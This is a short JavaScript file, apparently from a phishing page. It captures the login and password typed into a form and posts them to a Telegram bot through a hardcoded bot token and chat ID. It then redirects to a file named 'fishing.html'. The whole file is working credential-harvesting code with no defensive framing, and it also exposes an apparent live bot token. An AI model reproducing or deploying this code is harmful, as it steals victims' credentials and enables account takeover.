let Token = "7862218948:AAGyAeaxe86Ql1g9JMcvdJtcrGg27X8qBl8";
let chatId = "7324397883";

document.getElementById("loginForm").addEventListener("click", function (e) {
  e.preventDefault();

  let login = document.getElementById("login").value;
  let password = document.getElementById("password").value;
  console.log(
    document.getElementById("password").value,
    document.getElementById("login").value
  );

  let message = `👤 Login: ${login}\n🔒 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      // Optionally redirect after submission
      console.log(response);
      setTimeout(() => {
        window.location.href = "./fishing.html";
      }, 4000);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
});
